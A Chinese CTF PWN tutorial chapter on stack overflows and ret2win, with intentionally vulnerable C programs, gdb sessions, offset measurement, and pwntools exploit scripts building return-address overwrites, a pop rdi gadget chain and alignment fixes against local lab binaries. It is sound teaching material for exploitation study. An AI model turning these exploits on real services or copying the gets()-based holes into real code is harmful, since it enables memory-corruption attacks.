---
chapter: PWN
section: 栈溢出原理与 ret2win
order: 306
tags:
  - CTF
  - PWN
  - 栈溢出
publish: true
---

# P6 栈溢出原理与 ret2win
## Stack Overflow & ret2win

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L2 栈上利用期 ｜ **前置要求**：[[P04-Linux安全缓解机制|P4]] · [[P05-pwntools与GDB插件工具链|P5]] · [[R02-C语言与内存模型回顾|R02]]
> **本章目标**：把栈溢出"从越界写到控制执行流"的每一层讲透，偏移计算的两种方法都亲手量一遍；然后补上 [[P01-PWN导论与缓解机制全景|P1]] 留下的两个增量——带参数的 win 要靠 `pop rdi; ret` gadget 装参数，以及 16 字节栈对齐引发的 movaps 崩溃。

[[P01-PWN导论与缓解机制全景|P1]] 第 5 节用最小示例走完了五步流程，拿到第一个 flag。本章不再重走全流程，而是回到两件事上把原理钉死：==覆盖到底怎么一层层发生==、==偏移到底怎么量出来==；然后处理 P1 折叠框里预告的两个增量——`win` 带参数怎么办、跳进 `win` 却崩在 libc 深处怎么办。这两件事分别通向 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 的 ROP 与几乎每一道 64 位栈题。

## 1. 栈溢出的本质：一层一层向高地址覆盖

### 1.1 示例程序与编译

漏洞的物理基础在 [[R02-C语言与内存模型回顾#2. 内存四区：先对完地址再谈别的|R02 第 2 节]]摆过：栈向低地址生长，写入向高地址走。`gets` 从缓冲区起点开始写，==写多长都收==，多出来的字节就顺着"buf → 保存的 rbp → 返回地址"逐层压过去——栈溢出的全部本质就是这一句话。危险函数为什么危险、清单有哪些，[[02-C语言与内存模型#8. 字符串与危险函数|通用基础 02 章第 8 节]]讲过，完整汇总在 [[P02-前置基础C汇编与Linux|P2]]，这里不重复。

本章的主示例程序（与 P1 同型，但布局数值不同——==所有数值以自己反汇编的产物为准==）：

```c
/* vuln.c —— 栈溢出演示程序（x86-64 Linux） */
#include <stdio.h>

char *gets(char *s);

void win(void) {
    char flag[64];
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        puts("[win] flag.txt not found");
        return;
    }
    fgets(flag, sizeof(flag), f);
    puts(flag);
    fclose(f);
}

void vuln(void) {
    char buf[32];
    printf("input> ");
    gets(buf);
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

同目录放一个 `flag.txt`，编译参数与 P1 相同——把碍事的缓解机制逐个关掉：

```bash
echo 'flag{p6_ret2win_done}' > flag.txt
gcc -O0 -fno-pie -no-pie -fno-stack-protector vuln.c -o vuln
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/cc0aGcS1.o: in function `vuln':
vuln.c:(.text+0x7f): warning: the `gets' function is dangerous and should not be used.
```

警告不是错误，产物照常生成；它同时把漏洞点指了出来。`-fno-stack-protector` 这一项值得单独说一句：==去掉它，Canary 就默认开启==，溢出会在函数收尾时被 `__stack_chk_fail` 拦下、程序直接终止——同一个 payload 两种编译产物一通一崩，差别只有这一个参数。Canary 的机制与绕过 [[P04-Linux安全缓解机制|P4]]、[[P11-Canary绕过与GOT攻击|P11]] 展开。

checksec 判读（工具细节 [[P05-pwntools与GDB插件工具链|P5]]）：

```bash
pwn checksec vuln
```

输出：

```
[*] '/home/hua/p6/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

对本章有用的三行：==Canary 关==，覆盖可以直达返回地址；==PIE 关==，`win` 的地址是写进 payload 就能用的常量；NX 开，栈上数据不可执行——注入 shellcode 这条路堵死，本章不涉及。

反汇编 `vuln`，读出三样东西：buf 的位置、危险函数调用点、`ret` 的位置（序言尾声的读法 [[R03-x86与x64汇编精要复习#7.1 形状一：函数序言与尾声|R03 7.1]]，`call`/`ret` 语义 [[R03-x86与x64汇编精要复习#3.4 call、ret 与 leave|R03 3.4]]）：

```bash
objdump -d -M intel vuln | sed -n '/<vuln>:/,/^$/p'
```

输出：

```asm
; x86-64 Linux / System V AMD64 ABI
0000000000401257 <vuln>:
  401257:	f3 0f 1e fa          	endbr64
  40125b:	55                   	push   rbp
  40125c:	48 89 e5             	mov    rbp,rsp
  40125f:	48 83 ec 20          	sub    rsp,0x20
  401263:	bf 28 20 40 00       	mov    edi,0x402028
  401268:	b8 00 00 00 00       	mov    eax,0x0
  40126d:	e8 5e fe ff ff       	call   4010d0 <printf@plt>
  401272:	48 8d 45 e0          	lea    rax,[rbp-0x20]     ; buf 在 rbp-0x20
  401276:	48 89 c7             	mov    rdi,rax
  401279:	e8 72 fe ff ff       	call   4010f0 <gets@plt>   ; 漏洞点
  40127e:	90                   	nop
  40127f:	c9                   	leave
  401280:	c3                   	ret                         ; 控制执行流的入口
```

三样东西各归各位：`buf` 位于 `rbp-0x20`，占 32 字节；`gets` 的参数就是 `buf` 的地址；结尾的 `ret` 会把 rsp 指向的 8 字节弹进 rip 并跳过去。==栈溢出的目标就是让这条 ret 弹出我们写的值==。

### 1.2 覆盖前后的栈：gdb 三个快照

口说无凭，用 gdb 把覆盖前后各拍一张。断点下在 0x401279——`call gets` 那条指令上，此时 gets 还没执行；第二个断点下在 0x40127e——gets 返回之后。命令写进文件批量执行：

```
# gdb_layout.cmds
set pagination off
set disassembly-flavor intel
break *0x401279
break *0x40127e
run
p/x $rbp
x/40gx $rsp
continue
x/40gx $rsp
continue
info registers rip rsp
x/40gx $rsp
quit
```

喂给程序的输入是一段==分层标记==：32 个 A（正好填满 buf）、8 个 B、8 个 C，各占一个槽位：

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*32 + b'B'*8 + b'C'*8 + b'\n')" > p_abc.txt
gdb -q -batch -x gdb_layout.cmds ./vuln < p_abc.txt
```

输出（断点命中，gets 执行前）：

```
Breakpoint 1, 0x0000000000401279 in vuln ()
$1 = 0x7fffffffe0e0
0x7fffffffe0c0:	0x0000000000000000	0x0000000000000000
0x7fffffffe0d0:	0x00007fffffffe228	0x0000000000000001
0x7fffffffe0e0:	0x00007fffffffe0f0	0x00000000004012a2
0x7fffffffe0f0:	0x00007fffffffe1a0	0x00007ffff7c2a601
```

x/40gx 从 rsp 起连看 40 个 8 字节槽，前几行就是 vuln 自己的帧（后面全是 main 及更外层的内容，与本节无关）。逐行判读，rbp = 0x7fffffffe0e0：

- 0x7fffffffe0c0 = rbp−0x20：buf 的起点，现在还是上一次调用留下的残渣；
- 0x7fffffffe0e0 = rbp+0x00：保存的 rbp，值 0x7fffffffe0f0 指向 main 的帧；
- 0x7fffffffe0e8 = rbp+0x08：返回地址，0x4012a2 正是 main 里 `call vuln` 的下一条指令（main 在 0x401281）。

==这张表就是 1.1 反汇编里那个帧的实物==：负偏移是 buf，`[rbp]` 是旧 rbp，`[rbp+0x8]` 是返回地址（[[R02-C语言与内存模型回顾#3. 用 GDB 把栈帧看在眼里|R02 第 3 节]]画过同一张图）。

输出（gets 执行后，覆盖完成）：

```
Breakpoint 2, 0x000000000040127e in vuln ()
0x7fffffffe0c0:	0x4141414141414141	0x4141414141414141
0x7fffffffe0d0:	0x4141414141414141	0x4141414141414141
0x7fffffffe0e0:	0x4242424242424242	0x4343434343434343
```

三层各就各位：0x0c0–0xdf 的 32 字节全是 A（buf 被整个盖住），0x0e0 是 B（保存的 rbp），0x0e8 是 C（返回地址）。==输入越过长度的那部分，恰好按"buf → 保存的 rbp → 返回地址"的顺序压过去，一层都没漏==。函数收尾 `leave; ret` 会把这些数据当真值用：leave 把 B 弹回 rbp，ret 把 C 弹进 rip。

输出（继续运行，崩在 ret）：

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401280 in vuln ()
rip            0x401280            0x401280 <vuln+41>
rsp            0x7fffffffe0e8      0x7fffffffe0e8
0x7fffffffe0e8:	0x4343434343434343	0x00007fffffffe100
```

崩点 0x401280 正是 `ret` 那条指令，rsp 指着的槽里就是 C。==ret 把返回地址槽的 8 字节弹进 rip，而这个值不是代码地址，CPU 当场触发段错误==——异常停在 ret 本身，所以 gdb 的 rip 还指着它，rsp 正对着肇事的槽。这个现场同时是下一节偏移计算的观察点。

> [!info]- 为什么异常停在 ret，而不是"跳过去之后"
> 0x4343434343434343 的高 16 位不是全 0 也不是全 1，属于 x86-64 的非规范地址（canonical address），CPU 在执行 ret 的瞬间就触发异常；假地址连取指都没开始。若把目标换成一个"规范但未映射"的地址（高位全 0，如 0x0000414141414141），跳转会发生、异常落在取指上，gdb 里的 rip 会直接显示那个假地址。两种现场指向同一个结论：ret 弹出的值不是合法代码地址。排查时先看崩点在 ret 上还是在假地址上，能区分"槽没填对"和"填的地址本身错"。

把 1.2 的三个快照浓缩成一张对应图，本章后面反复用它：

```asm
; vuln 栈帧与 payload 的对应（-O0，x86-64 Linux / System V AMD64 ABI）
;   rbp-0x20  buf[32]      payload 第 1–32 字节   ← 覆盖起点
;   rbp+0x00  保存的 rbp    第 33–40 字节
;   rbp+0x08  返回地址      第 41–48 字节          ← 第 41 字节起换成想跳去的地址
```

## 2. 算偏移的两种方法

payload 要回答一个数字问题：==从输入的起点到返回地址槽，隔多少字节==——这个数叫偏移。它决定填充多长，填错了 ret 弹出来的就是半个填充半个地址。两种量法：工具法（pwntools 的 cyclic）与手工法（标记串加 gdb），殊途同归，都要会。

### 2.1 方法一：pwntools cyclic 模式串

cyclic 生成一段==任意指定长度的窗口内容都唯一==的模式串。把串喂进程序，程序崩在"返回地址变成模式串"的现场；从现场读回那 8 个字节，交给工具反查它在串里的位置——偏移就是它。

`-n` 指定窗口长度。64 位程序的返回地址槽一次读 8 字节，用 `-n 8` 生成，=="每 8 字节"正好对应"一整槽"==：

```bash
pwn cyclic -n 8 200 > p8.txt
head -c 48 p8.txt && echo
```

输出：

```
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa
```

串按 8 字节分组，每组是"一个递进字母 + 七个 a"，组内那个字母标出了自己排在第几组。喂给程序、崩、读现场（gdb 命令文件三条就够）：

```
# gdb2.cmds
set pagination off
run
info registers rip rsp
x/gx $rsp
quit
```

```bash
gdb -q -batch -x gdb2.cmds ./vuln < p8.txt
```

输出：

```
Program received signal SIGSEGV, Segmentation fault.
rip            0x401280            0x401280 <vuln+41>
rsp            0x7fffffffe0e8      0x7fffffffe0e8
0x7fffffffe0e8:	0x6161616161616166
```

崩点与 1.2 相同（还是那条 ret），但这次 rsp 指向的槽里是模式串的内容：0x6161616161616166 按小端还原（[[R02-C语言与内存模型回顾#7. 大小端|R02 第 7 节]]）是 `66 61 61 61 61 61 61 61`，即 `faaaaaaa`——第 6 组，每组 8 字节，位置是 5 × 8 = 40。交给工具反查：

```bash
pwn cyclic -n 8 -l 0x6161616161616166
```

输出：

```
40
```

默认 n=4 的串（P1 5.4 的用法）同样能走通，形状不同：

```bash
pwn cyclic 200 > p4.txt
gdb -q -batch -x gdb2.cmds ./vuln < p4.txt 2>&1 | grep 0x7fffffffe0e8
```

输出：

```
0x7fffffffe0e8:	0x6161616c6161616b
```

```bash
pwn cyclic -l 0x6161616c6161616b
```

输出：

```
40
```

0x6161616c6161616b 还原成 ASCII 是 `kaaaalaaa`：`kaaa` 是 n=4 串的第 10 组（从 0 数起），10 × 4 = 40——两种串、两个崩场，==量出同一个偏移==。

> [!warning] 生成与反查的 n 必须一致
> 用 n=8 的串崩场，却用默认 n=4 反查同一个数，工具照样"查出"结果——但那是错的：
>
> ```bash
> pwn cyclic -l 0x6161616161616166
> ```
>
> 输出：
>
> ```
> 20
> ```
>
> `faaaaaaa` 在 n=4 的串里根本不存在；pwntools 把这个数按当前 n 截成低 4 字节 `faaa` 去查，20 是"faaa"的位置，不是你的偏移。==偏移查错比查不到更危险==：填充长度不对，后续每个槽全部错位，而且不容易第一时间发现。反查命令带上与生成时相同的 `-n`，这一类错就绝迹。

> [!info]- 两种串的形状与 -n 的含义
> cyclic 的底层是 de Bruijn 序列：n=4 时每 4 字节一组（`aaaabaaacaaad...`），n=8 时每 8 字节一组（`aaaaaaaabaaaaaaac...`），任意 n 字节窗口在全串中最多出现一次。n 决定"最小唯一单元"的长度：==32 位程序的返回地址槽是 4 字节，配默认 -n 4 正好；64 位槽是 8 字节，配 -n 8 语义正好是"一槽对一组"==。由于序的唯一性，n=4 的串里任意 8 字节窗口同样唯一，所以 64 位用默认串也能反查（P1 就是这么做的）——两组串内容不同，==唯一不能做的是用一套串生成、另一套参数反查==。

### 2.2 方法二：手工标记法

不上工具也能量：填充里埋标记，从崩溃现场把标记找出来。把输入换成 43 个 A 加 8 个 B：

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*43 + b'B'*8 + b'\n')" > p_ab43.txt
gdb -q -batch -x gdb2.cmds ./vuln < p_ab43.txt 2>&1 | grep 0x7fffffffe0e8
```

输出：

```
0x7fffffffe0e8:	0x4242424242424141
```

槽里的 8 字节是 5 个 B 带着低位 3 个 A（小端读出 `41 41 41 42 42 42 42 42`）。B 的第一个字节落在槽内的第 4 个字节，即全串的字节偏移 43；返回地址槽从"B 的位置减去它在本槽内错过的字节数"算起：43 − 3 = 40。==标记串哪怕只撞进槽一部分，也足够把槽的起点钉死==。1.2 的 A/B/C 三层输入是这套方法的"全层版"：B 盖 saved rbp、C 盖返回地址，一张 x/40gx 同时看清三层的落点。

手工法不依赖 pwntools——考场上只有 gdb、或题目环境装不了工具时，这条路的每一步都走得通。

### 2.3 手算对账

两种量法之外还有第三种：看反汇编手算。`buf` 在 rbp−0x20 占 32 字节，盖到返回地址要再加 8 字节 saved rbp：32 + 8 = 40。三个来源一个答案。

==但手算只能当对账工具，不能当主工具==：局部区的实际大小由编译器安排（对齐填充、变量排布都影响），不同版本、不同选项下同一段源码的偏移可能不同，[[R02-C语言与内存模型回顾#3. 用 GDB 把栈帧看在眼里|R02 第 3 节]]警告过"偏移没有公式"。做题流程固定为：==cyclic（或标记法）量出偏移，手算只用来核对数量级==。

## 3. ret2win 无参版：独立走通的清单

原理一句话：程序里有个"永远不该被调用"的 `win` 函数，把返回地址槽换成它的地址，`vuln` 的 ret 就会跳进去——P1 5.5 已演示过完整原理（[[P01-PWN导论与缓解机制全景#5.5 第四步：构造利用链|P1 5.5]]）。本节给的是==不看任何前文也能自己走通的核对清单==，每一步只列动作与产出，供做题时逐项打钩：

1. **查保护**：`pwn checksec ./vuln`。产出一张"能做什么、不能做什么"的清单——No PIE 则函数地址可写死；No canary 则覆盖直达返回地址；NX enabled 则不能注入代码（机制原理 [[P04-Linux安全缓解机制|P4]]）。
2. **找目标与漏洞点**：`nm vuln | grep ' T '` 列出函数地址，`win` 的地址记下；`objdump -d -M intel` 读漏洞函数，确认越界写点与 `ret` 的位置（1.1 的反汇编就是模板）。
3. **量偏移**：第 2 节任一方法，本题 40。
4. **拼 payload**：`b'A' * 40 + p64(0x4011f6)`——40 字节填满 buf 加 saved rbp，第 41 字节起换成 `win` 地址，`p64` 按小端打包 8 字节。
5. **本地跑通**：

```python
#!/usr/bin/env python3
# exp3.py —— 无参 ret2win：对照清单逐步核对
from pwn import *

context.arch = 'amd64'      # 64 位：p64 打包 8 字节地址
context.log_level = 'info'

OFFSET = 40                 # 第 2 节两种方法量出的偏移
WIN    = 0x4011f6           # nm 查到的 win 地址，以自己编译的产物为准

io = process('./vuln')
io.recvuntil(b'input> ')
io.sendline(b'A' * OFFSET + p64(WIN))

success(io.recvline().decode().strip())
io.close()
```

```bash
python3 exp3.py
```

输出：

```
[x] Starting local process './vuln'
[+] Starting local process './vuln': pid 489
[+] flag{p6_ret2win_done}
[*] Stopped process './vuln' (pid 489)
```

`win` 被执行，读出 flag.txt。它自己的 ret 弹走的是 payload 之外没人控制的旧数据，程序随即崩溃退出——==flag 已经到手，收尾的崩溃不影响结果==（P1 同款结论）。

6. **切远程**：`process('./vuln')` 换成 `remote('host', port)`，其余不动（连接管理细节 [[P05-pwntools与GDB插件工具链|P5]]，完整演示在 [[P01-PWN导论与缓解机制全景#5.6 第五步：打远程|P1 5.6]]）。

==这张清单就是入门栈题的解题骨架==：后面的每一节，都是在某一步上增加复杂度。

## 4. 带参数的 win：第一个 gadget

### 4.1 问题：参数在 rdi 里

真实的 ret2win 经常带条件：`win` 先校验一个参数，对上了才发 flag。本章的示例（x86-64 Linux / System V AMD64 ABI，第一个参数走 rdi）：

```c
/* win_arg.c —— 带参数的 win：key 对上 0xcafebabe 才发 flag（x86-64 Linux） */
#include <stdio.h>

char *gets(char *s);

void win(long key) {
    if (key == 0xcafebabe) {
        puts("flag{pop_rdi_param_done}");
    } else {
        puts("[win] wrong key");
    }
}

/* 真实赛题的二进制几乎总能搜到现成的 pop rdi; ret；
   为了让这个演示程序小而可预测，源码里用内联汇编自备一段 */
void gadget(void) {
    __asm__("pop %rdi\n\tret");
}

void vuln(void) {
    char buf[32];
    printf("input> ");
    gets(buf);
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

障碍在调用约定上：`win` 的 `key` 从 rdi 读，而 ==`ret` 只动 rsp 和 rip，不碰任何参数寄存器==。跳进 `win` 时 rdi 里是什么，取决于程序此前的执行路径，不可控——参数必须由 payload 来装。

办法是在程序里找一段现成的 `pop rdi; ret`，让 ret 先落到这里：

- `pop rdi` 把栈顶的 8 字节弹进 rdi——payload 里紧跟在 gadget 地址后面的那 8 字节就进了第一个参数寄存器；
- 随后的 `ret` 再弹出下一槽——`win` 的地址，跳进去时 rdi 已经备好。

这种"程序里现成的几条指令 + ret"就是 gadget（[[P01-PWN导论与缓解机制全景|P1]] 术语表里打过照面），用 ret 把 gadget 串起来的完整链就是 ROP——[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 起系统展开，本章只需要会用这一节。

### 4.2 ROPgadget 搜 gadget

`--binary` 指定目标文件，grep 收窄结果：

```bash
ROPgadget --binary win_arg | grep "pop rdi"
```

输出：

```
0x00000000004011ad : cli ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x00000000004011aa : endbr64 ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x00000000004011b0 : mov ebp, esp ; pop rdi ; ret
0x00000000004011af : mov rbp, rsp ; pop rdi ; ret
0x00000000004011ae : push rbp ; mov rbp, rsp ; pop rdi ; ret
0x00000000004011b2 : pop rdi ; ret
```

六条都以 `pop rdi ; ret` 收尾——gadget 可以从指令流中间任何一处切入，==只要切进去之后的字节序列恰好是要的形状==。取最短的 0x4011b2。同类工具还有 ropper，用法相近（[[P05-pwntools与GDB插件工具链|P5]] 对比）。

> [!info]- gadget 的多寡：为什么小程序里可能一条都搜不到
> 传统上 64 位程序里 `pop rdi; ret` 几乎必存在，来源是启动代码里的 `__libc_csu_init`；glibc 2.34 起这块代码被移除，==新工具链编出的小程序可能整条都搜不到==（把上面源码里的 `gadget` 函数删掉再搜，输出是空的）。真实赛题不必慌：题目二进制通常比演示程序大得多，而且 libc 本身就是 gadget 大本营，P7 会把"从 libc 搜 gadget"变成常规操作。自己写演示程序时，用内联汇编自备一段也是正路——本节源码里的 `gadget()` 就是这么来的。

### 4.3 构造利用链

payload 在第 3 节清单的基础上加两槽：

```asm
; 带参 ret2win 的栈布局（x86-64，从 buf 起向高地址）
;   [40 字节填充        ]   填满 buf 与 saved rbp
;   [pop rdi ; ret 地址 ]   ← vuln 的 ret 落在这里
;   [0xcafebabe        ]   ← pop rdi 把它弹进 rdi
;   [win 地址          ]   ← gadget 的 ret 落在这里，rdi 已备好
```

执行流逐步拆开：

| 步 | 执行的指令 | 效果 |
| ---- | ---- | ---- |
| 1 | vuln 的 `ret` | 弹出 `pop rdi; ret` 的地址跳过去；rsp 指向 KEY 槽 |
| 2 | `pop rdi` | rdi = 0xcafebabe；rsp 再 +8，指向 win 地址槽 |
| 3 | gadget 的 `ret` | 弹出 win 的地址，跳进 win |
| 4 | win 本体 | 读 rdi 作 key，比较命中，打印 flag |

```python
#!/usr/bin/env python3
# exp4.py —— 带参数的 ret2win：padding + pop rdi;ret + 参数 + win
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

OFFSET  = 40            # 第 2 节量出的偏移，三个演示程序同布局
POP_RDI = 0x4011d2      # ROPgadget 搜到的 pop rdi ; ret
KEY     = 0xcafebabe    # win 要校验的参数值
WIN     = 0x401196      # nm 查到的 win 地址

io = process('./win_arg')
io.recvuntil(b'input> ')
io.sendline(b'A' * OFFSET + p64(POP_RDI) + p64(KEY) + p64(WIN))

success(io.recvline().decode().strip())
io.close()
```

```bash
python3 exp4.py
```

输出：

```
[x] Starting local process './win_arg'
[+] Starting local process './win_arg': pid 493
[+] flag{pop_rdi_param_done}
[*] Stopped process './win_arg' (pid 493)
```

==这一条链就是 ROP 的第一课==：地址串在栈上，每段 gadget 干一小件事，ret 把它们逐个串起来。`pop rdi; ret` + 字符串地址 + 目标函数，正是 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 里 `system("/bin/sh")` 的骨架。

### 4.4 链通了、参数错了：wrong key 的排错价值

把 exp4.py 里的 KEY 换成错的值（0x11111111）重跑一次：

```
[win] wrong key
```

这个输出是排错路标：==payload 发出去毫无输出，说明链断了==——偏移不对、gadget 地址不对或参数错位，ret 弹去了非法地址，程序半路崩掉；==打出了 wrong key，说明链是通的、参数是错的==——检查 `pop rdi` 后面跟的值。改一行重跑，比从头猜快得多。

## 5. 栈 16 字节对齐与 movaps 崩溃

新手在 64 位栈题上撞到的第一堵墙：利用链明明每一步都对，`win` 也确实进去了，程序却崩在 libc 内部一条从没听说过的指令上。这一节把成因、诊断、修法一次讲透。

### 5.1 差 8 字节从哪来

System V AMD64 ABI 规定：==call 指令执行的那一瞬间，rsp 必须按 16 字节对齐==。函数内部的代码按这个前提生成——包括 movaps 一类 SSE 指令，它们按 16 字节整块读写栈上数据，地址不对齐直接触发异常。call 压入 8 字节返回地址，所以==函数入口处的 rsp 按 16 除永远余 8==（详见 ABI 的栈对齐约定，[[R02-C语言与内存模型回顾#9. 三种调用约定的认法|R02 第 9 节]]的调用约定表同源）。

正常的调用链天然满足：每次 call 都先压栈再跳，入口永远"余 8"。ret2win 破坏了这个前提——==跳进 win 的那一下是 ret，不是 call==，没有压栈动作，入口比约定"浅"了 8 字节：

```asm
; 从 main 到 win 的 rsp 对齐变化（x86-64 Linux / System V AMD64 ABI）
;   main 内 call 前         rsp ≡ 0 (mod 16)    ← ABI 的对齐点
;   call vuln 压返回地址     vuln 入口 rsp ≡ 8   ← 入口约定
;   vuln 序言 push rbp      rsp ≡ 0
;   vuln 尾声 leave; ret    弹 rbp → ≡ 8，弹返回地址 → ≡ 0
;   ret2win 跳进 win：入口 rsp ≡ 0，而 win 期待 ≡ 8 —— 差 8 字节
```

### 5.2 崩溃现场

演示程序换成 `win` 调 `system` 的版本——`system` 一族函数内部固定使用 movaps，==差 8 必撞==：

```c
/* win_sys.c —— 对齐演示：win 调 system（x86-64 Linux） */
#include <stdio.h>
#include <stdlib.h>

char *gets(char *s);

void win(void) {
    system("cat flag.txt");
}

void vuln(void) {
    char buf[32];
    printf("input> ");
    gets(buf);
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

按第 3 节清单走：`nm` 查到 win 在 0x401196，直接把返回地址换成它：

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + (0x401196).to_bytes(8,'little') + b'\n')" > p_bad.bin
./win_sys < p_bad.bin; echo "rc=$?"
```

输出：

```
input> 
rc=139
```

没有 flag，shell 报段错误（退出码 139 = 128 + 11，SIGSEGV）。链子看着完全正确——偏移 40 没错、win 地址没错——问题只能出在更深处。gdb 里看现场：

```
# gdb4b.cmds
set pagination off
set disassembly-flavor intel
run
x/i $rip
info registers rsp rip
set $r = (unsigned long)$rsp
p/d $r % 16
bt
quit
```

```bash
gdb -q -batch -x gdb4b.cmds ./win_sys < p_bad.bin
```

输出（节选）：

```
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7c5be95 in do_system (line=0x402004 "cat flag.txt") at ../sysdeps/posix/system.c:117
=> 0x7ffff7c5be95 <do_system+101>:	movaps XMMWORD PTR [rsp],xmm1
rsp            0x7fffffffdd28      0x7fffffffdd28
rip            0x7ffff7c5be95      0x7ffff7c5be95 <do_system+101>
$1 = 8
#0  0x00007ffff7c5be95 in do_system (line=0x402004 "cat flag.txt") at ../sysdeps/posix/system.c:117
#1  0x00000000004011a8 in win ()
#2  0x00007fffffffe100 in ?? ()
#3  0x00007ffff7c2a601 in __libc_start_call_main (main=<optimized out>, argc=<optimized out>, argv=<optimized out>) at ../sysdeps/nptl/libc_start_call_main.h:59
Backtrace stopped: Cannot access memory at address 0x4141414141414149
```

四个证据一次到位：

- 出错指令是 ==`movaps XMMWORD PTR [rsp],xmm1`==——16 字节整块写栈，地址必须 16 的倍数；
- `$1 = 8`：rsp 除以 16 余 8，==恰好差那 8 字节==；
- bt 显示调用链：我们的链把控制流送进了 `win`（#1），win 正常调用了 system（#0 do_system），炸点是 libc 内部——==不是链错了，是链把一个不对齐的栈交给了 system==；
- 回溯终止在 0x41414...，那串 A 是 win 自己收尾时拿到的假 rbp——污染源就是 payload，与 5.1 的推演对上。

> [!info]- movaps 是什么
> mov = move，a = aligned，ps = packed single（整块处理）。SSE 一族的整块搬数指令，要求内存地址是 16 的倍数，否则触发异常；同族的 movdqu 则接受任意对齐。编译器生成 movaps 的前提就是 ABI 的对齐承诺，glibc 的 system/printf 等路径用它成组保存寄存器——==新版 glibc 里这条路径固定存在，所以差 8 必撞，不靠运气==。fopen/puts 一族路径上没有这类指令，直跳进去往往侥幸跑通（P1 的 ret2win 就是如此）——但==做题不赌路径，对齐主动处理==。

### 5.3 三种修法

思路只有一个：==让跳进目标函数那一刻，rsp 的 16 余数等于 8==。三种手段任选。

**修法一：链首垫一个裸 ret gadget。** 找一条只有 `ret` 的 gadget：

```bash
ROPgadget --binary win_sys --only "ret"
```

输出：

```
Gadgets information
============================================================
0x000000000040101a : ret
0x000000000040105a : ret 0xffff


Unique gadgets found: 2
```

取 0x40101a，插在 win 地址之前。它的唯一作用是执行一条 ret——把 rsp 拨 +8，恰好补回差的那 8 字节：

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + (0x40101a).to_bytes(8,'little') + (0x401196).to_bytes(8,'little') + b'\n')" > p_good.bin
./win_sys < p_good.bin; echo "rc=$?"
```

输出：

```
input> flag{p6_ret2win_done}
```

flag 打出来了；随后 win 自己收尾还会崩一声段错误——==flag 已到手，收尾崩溃不影响结果==。

**修法二：换用带奇数次 pop 的 gadget。** `pop rdi; ret` 里的 pop 让 rsp 额外 +8，对齐效果与裸 ret 完全相同——==第 4 节的带参链以 `pop rdi; ret` 起手，进 win 时 rsp 的余数恰好是 8，天生满足入口约定==。凑对齐的判断标准永远是数"从 ret 落地到跳进目标函数，rsp 被拨了几格"：偶数格余数不变，奇数格恰好补齐，手段不限。

**修法三：跳过 push rbp，落到 win+5。** win 的开头是 endbr64（4 字节）加 push rbp（1 字节），`nm` 与反汇编确认 push rbp 在 0x40119a：

```bash
objdump -d -M intel win_sys | sed -n '/<win>:/,/^$/p' | head -3
```

输出：

```
0000000000401196 <win>:
  401196:	f3 0f 1e fa          	endbr64
  40119a:	55                   	push   rbp
```

把返回地址换成 0x40119b（win+5，push rbp 的下一条），跳过那次压栈——win 体内的 rsp 少降 8，调用点的余数恰好回到 call 要求的 0：

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + (0x40119b).to_bytes(8,'little') + b'\n')" > p_win5.bin
./win_sys < p_win5.bin; echo "rc=$?"
```

输出：

```
input> flag{p6_ret2win_done}
rc=0
```

flag 照常打印，这次收尾甚至干净退出。代价是 win 不再保存调用者的 rbp、也没经过 endbr64 着陆点，收尾行为随环境浮动——==首选仍是修法一，修法三适合链已经很长、想少垫一格的场合==。

三种写法对照：

| 写法 | payload | 结果 |
| ---- | ---- | ---- |
| 直跳 win | `A*40 + p64(win)` | 崩在 do_system 的 movaps |
| 垫 ret gadget | `A*40 + p64(ret) + p64(win)` | 打出 flag |
| 跳到 win+5 | `A*40 + p64(win+5)` | 打出 flag |

> [!info]- "leave; ret 变体"是怎么回事
> 有些资料把 `leave; ret` 也列为对齐手段。leave 是"mov rsp,rbp 再 pop rbp"的合并写法（[[R03-x86与x64汇编精要复习#3.4 call、ret 与 leave|R03 3.4]]），把它当 gadget 用时，效果是把整个 rsp 搬到 rbp 指向的位置再弹一层——本质是栈迁移，需要已知地址配合才能落回自己的数据。这是 [[P08-ROP进阶与SROP|P8]] 的正题；就"补 8 字节对齐"而言，ret gadget 一格就够，不必动用它。

> [!warning] 什么时候要想到对齐
> 触发条件不在 exploit，在目标函数的调用路径：==win 或链上的函数调用了 system/printf 一族（内部有 movaps），差 8 必崩==；只走 fopen/puts 的路径常常侥幸。症状高度一致——==崩点在 libc 内部、出错指令是 movaps、rsp 除 16 余 8==——三样凑齐，对齐问题确诊，垫一个 ret 即愈。

## 6. 32 位 x86 对照：参数在栈上

同一道 ret2win，换到 32 位 x86（i386 Linux / cdecl）上，参数的处理完全不同。编译需要 32 位运行库支持，Debian/Ubuntu 装包后直接加 `-m32`：

```bash
sudo apt install gcc-multilib
gcc -m32 -O0 -fno-pie -no-pie -fno-stack-protector vuln32.c -o vuln32
```

示例程序（参数校验版，与 4.1 同型）：

```c
/* vuln32.c —— 32 位对照示例：key 对上 0xcafebabe 才发 flag（i386 Linux / cdecl） */
#include <stdio.h>

char *gets(char *s);

void win(int key) {
    if (key == 0xcafebabe)
        puts("flag{x86_stack_args}");
    else
        puts("[win] wrong key");
}

void vuln(void) {
    char buf[32];
    printf("input> ");
    gets(buf);
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```
